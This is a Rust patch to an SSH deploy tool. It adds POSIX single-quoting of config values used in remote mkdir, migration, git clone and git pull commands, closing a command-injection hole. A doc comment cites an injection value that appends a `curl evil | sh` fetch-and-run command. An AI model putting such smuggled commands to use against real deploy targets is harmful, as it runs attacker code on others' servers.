@@ -397,6 +397,16 @@ async fn sync_code_rsync(
     Ok(())
 }
 
+/// POSIX single-quote a value for safe interpolation into a remote shell
+/// command. Deploy config (`server.folder`, git URL/branch/subfolder) is
+/// otherwise concatenated straight into strings passed to the remote login
+/// shell, so a folder like `/srv/app; curl evil | sh` would be command
+/// injection on the deploy target. Single-quoting neutralizes every shell
+/// metacharacter; an embedded `'` is closed, backslash-escaped, and reopened.
+fn shell_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', "'\\''"))
+}
+
 async fn ensure_remote_folder(server: &ServerConfig) -> Result<(), String> {
     let session = ssh_connect(server).await?;
     let mut channel = session
@@ -404,7 +414,7 @@ async fn ensure_remote_folder(server: &ServerConfig) -> Result<(), String> {
         .map_err(|e| format!("Failed to open channel: {}", e))?;
 
     channel
-        .exec(&format!("mkdir -p {}", server.folder))
+        .exec(&format!("mkdir -p {}", shell_quote(&server.folder)))
         .map_err(|e| format!("Failed to mkdir on remote: {}", e))?;
 
     let mut stderr = String::new();
@@ -446,7 +456,7 @@ async fn run_migrations(
         }
     };
 
-    let migration_cmd = format!("cd {} && soli db:migrate up", target);
+    let migration_cmd = format!("cd {} && soli db:migrate up", shell_quote(&target));
 
     let mut channel = session
         .channel_session()
@@ -553,7 +563,7 @@ fn check_remote_folder_exists(session: &Session, folder: &str) -> Result<bool, S
         .map_err(|e| format!("Failed to open channel: {}", e))?;
 
     channel
-        .exec(&format!("test -d {} && echo 'exists'", folder))
+        .exec(&format!("test -d {} && echo 'exists'", shell_quote(folder)))
         .map_err(|e| format!("Failed to execute: {}", e))?;
 
     let mut output = String::new();
@@ -587,16 +597,19 @@ fn git_clone(
     let clone_cmd = if git_folder == "/" || git_folder.is_empty() {
         format!(
             "mkdir -p {} && cd {} && git clone --branch {} {} .",
-            target, parent, branch, git_url
+            shell_quote(&target),
+            shell_quote(parent),
+            shell_quote(branch),
+            shell_quote(git_url)
         )
     } else {
         format!(
             "mkdir -p {} && cd {} && git clone --branch {} {} {}",
-            target,
-            parent,
-            branch,
-            git_url,
-            git_folder.trim_end_matches('/')
+            shell_quote(&target),
+            shell_quote(parent),
+            shell_quote(branch),
+            shell_quote(git_url),
+            shell_quote(git_folder.trim_end_matches('/'))
         )
     };
 
@@ -639,7 +652,11 @@ fn git_pull(session: &Session, folder: &str, git_folder: &str, branch: &str) -> 
         .channel_session()
         .map_err(|e| format!("Failed to open channel: {}", e))?;
 
-    let pull_cmd = format!("cd {} && git pull origin {}", target, branch);
+    let pull_cmd = format!(
+        "cd {} && git pull origin {}",
+        shell_quote(&target),
+        shell_quote(branch)
+    );
 
     channel
         .exec(&pull_cmd)
